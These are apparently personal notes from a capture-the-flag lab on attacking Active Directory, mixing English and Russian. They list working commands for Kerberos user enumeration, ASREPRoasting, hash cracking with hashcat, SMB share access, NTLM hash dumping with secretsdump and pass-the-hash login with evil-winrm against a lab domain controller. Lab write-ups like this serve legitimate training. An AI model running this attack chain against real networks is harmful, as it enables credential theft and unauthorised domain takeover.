Kerberos is a key authentication service within Active Directory.
Discovery of users, passwords and even password spray!: https://github.com/ropnop/kerbrute/releases
Username list: https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
Password list: https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
НЕ рекомендуется использовать перебор учетных данных из-за политик блокировки учетных записей, которые мы не можем перечислить на контроллере домена.

После завершения перечисления учетных записей пользователей мы можем попытаться злоупотребить функцией Kerberos с помощью метода атаки под названием ASREPRoasting. ASReproasting происходит, когда для учетной записи пользователя установлена привилегия «Не требует предварительной аутентификации». Это означает, что учетной записи не требуется предоставлять действительную идентификацию перед запросом билета Kerberos для указанной учетной записи пользователя.

Exploitation: Impacket has a tool called "GetNPUsers.py"
https://hashcat.net/wiki/doku.php?id=example_hashes

Crack hash: hashcat -m 18200 hash passwordlist.txt --force
Valid user enumeration: ./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt
List shares: smbclient -L 10.10.4.164 --user svc-admin
Access share: smbclient //10.10.4.164/backup --user svc-admin or smbclient spookesec.local/username:password@IP
NTLM hash dump: secretsdump.py backup@10.10.4.164 -just-dc
With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

evil-winrm -i IP -u user -H hash
